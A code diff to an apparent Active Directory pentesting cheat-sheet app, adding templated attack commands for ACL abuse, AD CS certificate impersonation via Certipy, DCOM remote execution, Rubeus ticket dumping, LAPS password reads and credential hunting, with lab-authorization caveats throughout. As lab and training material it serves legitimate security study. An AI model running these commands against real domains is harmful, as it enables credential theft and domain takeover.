@@ -30,6 +30,9 @@ export class ActiveDirectory implements OnInit {
     { id: 'credentials', label: 'Credential Access', group: 'Attacking' },
     { id: 'kerberos', label: 'Kerberos Attacks', group: 'Attacking' },
     { id: 'passwords', label: 'Password Attacks', group: 'Attacking' },
+    { id: 'adcs', label: 'AD Certificate Services (ADCS)', group: 'Attacking' },
+    { id: 'dcom', label: 'DCOM Lateral Movement', group: 'Attacking' },
+    { id: 'post-exploitation-checklist', label: 'Post-Compromise Checklist', group: 'Post-Exploitation' },
     { id: 'compromise', label: 'Domain Compromise', group: 'Attacking' },
     { id: 'ad-example-three-host', label: 'Three-Host Domain Chain', group: 'Examples' },
     { id: 'planned-privesc', label: 'Privilege Escalation', group: 'Coming later', disabled: true }
@@ -219,6 +222,26 @@ Get-NetGroup "Management Department" | Select-Object member
 
 # Remove the user from the group
 net group "Management Department" stephanie /delete /domain
+`;
+
+  aclAbuseWorkflow = String.raw`# Assess ACL paths identified by BloodHound or Get-ObjectAcl.
+# Use only with an explicitly authorized lab account and object.
+
+# GenericAll / ForceChangePassword: reset a test user's password
+bloodyAD --host <DC_IP> -d <DOMAIN> -u <USER> -p '<PASSWORD>' set password <TARGET_USER> '<NEW_TEST_PASSWORD>'
+
+# WriteDACL: a principal can grant an additional object right
+bloodyAD --host <DC_IP> -d <DOMAIN> -u <USER> -p '<PASSWORD>' add dacl "<TARGET_GROUP>" <USER> GenericAll
+
+# WriteOwner: set the owner, then review whether an ACL change is permitted
+Set-DomainObjectOwner -Identity <TARGET_OBJECT> -OwnerIdentity <USER>
+Add-DomainObjectAcl -TargetIdentity <TARGET_OBJECT> -PrincipalIdentity <USER> -Rights All
+
+# Verify the resulting ACL and group membership, then restore the original
+# state when the lab or engagement plan requires cleanup.
+
+# GPO review: identify who can edit/link the policy and which OUs it affects.
+# Do not alter production policy or deploy scripts outside the approved scope.
 `;
 
   // =========================================================
@@ -712,6 +735,62 @@ nxc smb <target-ip> -d <domain> -u <username> -p '<lab-password>' --shares
 `;
 
   // =========================================================
+  // ACTIVE DIRECTORY CERTIFICATE SERVICES
+  // =========================================================
+
+  adcsOverview = String.raw`# AD Certificate Services (AD CS) issues certificates used for
+# authentication by domain users and computers.
+# Misconfigured templates or permissions can expose identity paths.
+# Assess only the authorized domain and avoid retaining private keys.
+
+# Review certificate authorities, templates, permissions and findings.
+# Prioritize ESC findings only after validating the affected configuration.
+`;
+
+  adcsEnumeration = String.raw`# Enumerate certificate authorities and vulnerable templates
+certipy-ad find -u <USER>@<DOMAIN> -p '<PASSWORD>' -dc-ip <DC_IP> -vulnerable
+
+# Review CA name, target server, template name, enrollment rights,
+# subject/SAN settings, and template owner/write permissions.
+# Common findings to assess include ESC1, ESC2, ESC3, ESC4 and ESC8.
+`;
+
+  adcsTemplateReview = String.raw`# ESC4 assessment: a principal may have dangerous rights on a template.
+# Save the existing template configuration before any approved lab change.
+certipy-ad template -u <USER>@<DOMAIN> -p '<PASSWORD>' -template <TEMPLATE> -dc-ip <DC_IP> -save-configuration template-backup.json
+
+# Template modification changes Active Directory configuration.
+# Only perform a controlled demonstration when specifically authorized.
+certipy-ad template -u <USER>@<DOMAIN> -p '<PASSWORD>' -template <TEMPLATE> -dc-ip <DC_IP> -write-default-configuration -force
+
+# Restore the saved configuration after the test using the supported
+# Certipy template restore workflow for the installed version.
+`;
+
+  adcsCertificateRequest = String.raw`# Request a certificate from the identified CA and template
+certipy-ad req -u <USER>@<DOMAIN> -p '<PASSWORD>' -dc-ip <DC_IP> -target <DC_FQDN> -ca <CA_NAME> -template <TEMPLATE>
+
+# If the template permits an alternate UPN (for an approved lab test):
+certipy-ad req -u <USER>@<DOMAIN> -p '<PASSWORD>' -dc-ip <DC_IP> -target <DC_FQDN> -ca <CA_NAME> -template <TEMPLATE> -upn <TEST_USER>@<DOMAIN>
+
+# Modern environments may require a SID extension. Determine the correct
+# test account SID before requesting a replacement certificate.
+impacket-lookupsid <DOMAIN>/<USER>:'<PASSWORD>'@<DC_IP>
+certipy-ad req -u <USER>@<DOMAIN> -p '<PASSWORD>' -dc-ip <DC_IP> -target <DC_FQDN> -target-ip <DC_IP> -ca <CA_NAME> -template <TEMPLATE> -upn <TEST_USER>@<DOMAIN> -sid <TEST_USER_SID>
+`;
+
+  adcsCertificateAuth = String.raw`# Authenticate with the certificate produced by an approved lab request
+certipy-ad auth -pfx <CERTIFICATE>.pfx -dc-ip <DC_IP>
+
+# Review certificate identity and validity before using the result.
+certipy-ad cert -pfx <CERTIFICATE>.pfx
+
+# Troubleshooting: specify -target-ip <DC_IP> for RPC reachability issues;
+# if the KDC reports a SID mismatch, request a certificate with the correct SID.
+# Treat PFX files, tickets and returned hashes as credentials.
+`;
+
+  // =========================================================
   // DOMAIN COMPROMISE
   // =========================================================
 
@@ -819,6 +898,125 @@ evil-winrm -i {{TARGET_IP}} -u '<DOMAIN>\\<USER>' -p '<PASSWORD>'
 evil-winrm -i {{TARGET_IP}} -u '<DOMAIN>\\<USER>' -H <NTLM_HASH>
 `;
 
+
+  // =========================================================
+  // DCOM LATERAL MOVEMENT
+  // =========================================================
+
+  attackDcom = String.raw`# DCOM is a remote-execution option, not a privilege-escalation technique.
+# Requires authorized credentials, remote DCOM rights and RPC reachability.
+
+# Enumerate DCOM applications and registered COM identifiers
+Get-CimInstance Win32_DCOMApplication
+Get-ChildItem HKLM:\Software\Classes\AppID
+Get-ChildItem HKLM:\Software\Classes\CLSID
+
+# Controlled validation using MMC20.Application on an authorized lab host
+$dcom = [System.Activator]::CreateInstance(
+  [type]::GetTypeFromProgID("MMC20.Application.1", "<TARGET_HOST>")
+)
+$dcom.Document.ActiveView.ExecuteShellCommand("cmd", $null, "/c whoami", "7")
+
+# Method selection depends on target permissions and network policy:
+# SMB + local admin -> PsExec; WinRM rights -> WinRM;
+# WMI permissions -> WMI; DCOM permissions + RPC -> DCOM.
+# Commands execute as the supplied identity; verify the resulting context.
+`;
+
+  // =========================================================
+  // POST-COMPROMISE CHECKLIST
+  // =========================================================
+
+  postChecklistQuick = String.raw`# Use after authorized Administrator or SYSTEM access on a domain host.
+# Record findings, avoid unnecessary configuration changes and protect secrets.
+# [ ] Active sessions       [ ] LSASS / Kerberos
+# [ ] DPAPI / Credential Manager / profiles
+# [ ] Scheduled tasks / services / application configs
+# [ ] Certificates / BloodHound / delegation / LAPS
+# [ ] Validate credentials only against approved targets
+# [ ] Document impact and complete engagement cleanup
+`;
+
+  postChecklistSessions = String.raw`# Identify the current user and active interactive sessions
+whoami /all
+query user
+qwinsta
+quser
+tasklist /v
+
+# With authorized SMB credentials, review sessions on a scoped host
+nxc smb <TARGET> -u <USER> -p '<PASSWORD>' --sessions
+
+# Prioritize investigation of unexpected privileged, service,
+# backup-operator or other-user sessions; follow the approved process.
+`;
+
+  postChecklistCredentials = `# Use the Credential Access section for detailed LSASS and ticket commands.
+# Review DPAPI-protected data, Credential Manager and Windows Vault where
+# authorized. Results depend on the user context and available master keys.
+cmdkey /list
+vaultcmd /list
+vaultcmd /listcreds:"Windows Credentials"
+`;
+
+  postChecklistHostAudit = `# Review accessible user profiles and common file types for configuration exposure.
+dir %USERPROFILE%
+dir C:\ /s *.rdp
+dir C:\ /s *.ps1
+dir C:\ /s *.xml
+dir C:\ /s *.config
+dir C:\ /s *.ini
+
+# Scheduled tasks and services
+schtasks /query /fo LIST /v
+wmic service get Name,DisplayName,StartName,PathName
+Get-CimInstance Win32_Service | Select-Object Name,StartName,PathName
+
+# Inspect configuration files, service permissions and registry entries
+sc qc <SERVICE_NAME>
+icacls "<SERVICE_DIRECTORY>"
+findstr /spin "password passwd pwd secret token connectionstring user uid" *.config *.xml *.ini *.txt
+reg query HKLM\SYSTEM\CurrentControlSet\Services\<SERVICE_NAME>
+
+# Identify custom service accounts and investigate only approved paths.
+`;
+
+  postChecklistDirectory = String.raw`# Review local machine and user certificate stores
+certutil -store My
+certutil -user -store My
+
+# Collect relationship data only when authorized and within scope
+SharpHound.exe -c All
+bloodhound-python -u <USER> -p '<PASSWORD>' -d <DOMAIN> -ns <DC_IP> -c All
+
+# Inspect Kerberos tickets and delegation
+klist
+Rubeus.exe triage
+Rubeus.exe dump
+Get-DomainComputer -Unconstrained
+Get-DomainComputer -TrustedToAuth
+
+# Read LAPS data only where the account has permission
+Get-LapsADPassword
+nxc ldap <DC_IP> -u <USER> -p '<PASSWORD>' --query "(objectClass=computer)" "ms-Mcs-AdmPwd"
+
+# Review BloodHound computer objects, sessions, ACLs, delegation,
+# group membership and ReadLAPSPassword relationships.
+`;
+
+  postChecklistDecision = String.raw`# Choose the next validation path based on credential type and scope.
+# Password: validate against approved SMB / WinRM / RDP targets.
+# NTLM hash: use an approved Pass-the-Hash method where permitted.
+# AES key: assess a Kerberos Pass-the-Key path.
+# Kerberos ticket: verify identity, service, target and expiry with klist;
+# use the ticket only for the matching authorized service.
+# No usable credential: continue host, file, service and directory enumeration.
+
+# If a new host is reached, record its context and restart this checklist.
+# Before leaving: confirm profiles, DPAPI, Vault, tickets, tasks,
+# services, certificates, BloodHound, scripts/configs and lateral paths reviewed.
+# Redact secrets in notes and follow evidence-retention / cleanup requirements.
+`;
 
   // =========================================================
   // AD SET FLOW - SCAN
@@ -1010,13 +1208,13 @@ sudo ./proxy -selfcert
 ./agent -connect PROXY_IP:11601 -ignore-cert
 
 # After the agent connects:
-# 1. Select the correct session in the proxy.
-# 2. Start the tunnel.
-# 3. Configure the route to the lab subnet.
-# 4. Verify reachability before scanning.
+# 1. Select the connected session (session <SESSION_ID>).
+# 2. Start the tunnel (start).
+# 3. Configure the route to the lab subnet (autoroute where supported;
+#    otherwise configure the TUN interface and OS route).
+# 4. Verify reachability before scanning (ping <INTERNAL_HOST_IP>).
 #
-# Consult the Ligolo-ng documentation for your platform
-# and the exact route configuration required by your lab.
+# Consult the Ligolo-ng documentation for platform-specific route setup.
 `;
 
   // =========================================================
